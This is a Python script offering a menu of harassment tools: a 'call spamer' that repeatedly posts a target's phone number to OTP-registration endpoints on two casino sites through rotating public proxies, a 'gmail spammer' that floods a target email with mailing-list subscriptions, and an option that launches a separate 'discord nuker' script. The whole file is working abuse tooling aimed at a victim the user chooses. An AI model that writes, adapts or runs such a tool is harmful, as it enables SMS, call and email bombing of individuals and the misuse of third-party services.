import os,requests,gratient
from time import sleep
from asyncio import run
from random import choice
from httpx import post
#from threading import Thread


def clear():
	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')
clear()


def getproxie():
  q = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt')
  f = open('proxies.txt','wb')
  f.write(q.content)
  f.close()

getproxie()

proxy = open("proxies.txt", "r").read().splitlines()

def callspam():
  phone = input('phonenumber : ')
  amount = int(input('amount : '))
  async def call1():
    http = choice(proxy)
    while True:
      try:
        resp = requests.post("https://www.ez-casino.org/_ajax_/v3/register/request-otp", proxies={"http" : "http://" + http},headers={"Content-Type": "Application/x-www-form-urlencoded","Accept": "*/*","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"},data=F"phoneNumber={phone}")
        print(F'APIcall1 get requested from {http} : {resp.status_code}')
        break
      except: pass
  
  async def call2():
    http = choice(proxy)
    while True:
      try:
        resp = requests.post("https://v2.ez.casino/_ajax_/v3/register/request-otp",proxies={"http" : "http://" + http},headers={"X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2 Build/HUAWEIPPA-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 Mobile Safari/537.36 HuaweiBrowser/14.0.5.302 HMSCore/6.13.0.301","Content-Type": "Application/x-www-form-urlencoded"},data=F"phoneNumber={phone}")
        print(F'APIcall2 get requested from {http} : {resp.status_code}')
        break
      except: pass
  
  for _ in range(amount):
    run(call1())
    run(call2())



def gmailspam():
	http = choice(proxy)
	mail = input("target gmail : ")
	amount = int(input("amount : "))
	async def mailapi():
		while True:
			try:
				resp = post("http://list.sch.gr/mailman/subscribe/olme.list",headers={"User-Agent":"Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"},data=F"email={mail}&fullname=ajxjaox+skxbal&pw=Beenxd1234&pw-conf=Beenxd1234&digest=1&email-button=%26%233621%3B%26%233591%3B%26%233594%3B%26%233639%3B%26%233656%3B%26%233629%3B")
				print(F'attacked to {mail} {http} : {resp.status_code}')
				break
			except: pass
	
	for _ in range(amount):
		run(mailapi())
	
	


'''class rest:
	def resto():
		
		
			'''







def homepage():
  print('''
  
        select choice
      
        [1] call spamer
        [2] gmail spammer
        [3] discord nuker tools
  
  
  ''')
  select = input('choice : ')
  if select == '1':
    callspam()
    sleep(3)
    clear()
    homepage()
  elif select == '2':
    gmailspam()
    sleep(3)
    clear()
    homepage()
  elif select == '3':
    clear()
    os.system('python3 dcs.py')
  else:
    print(F'no function {select}!!!')
    clear()
    homepage()

homepage()
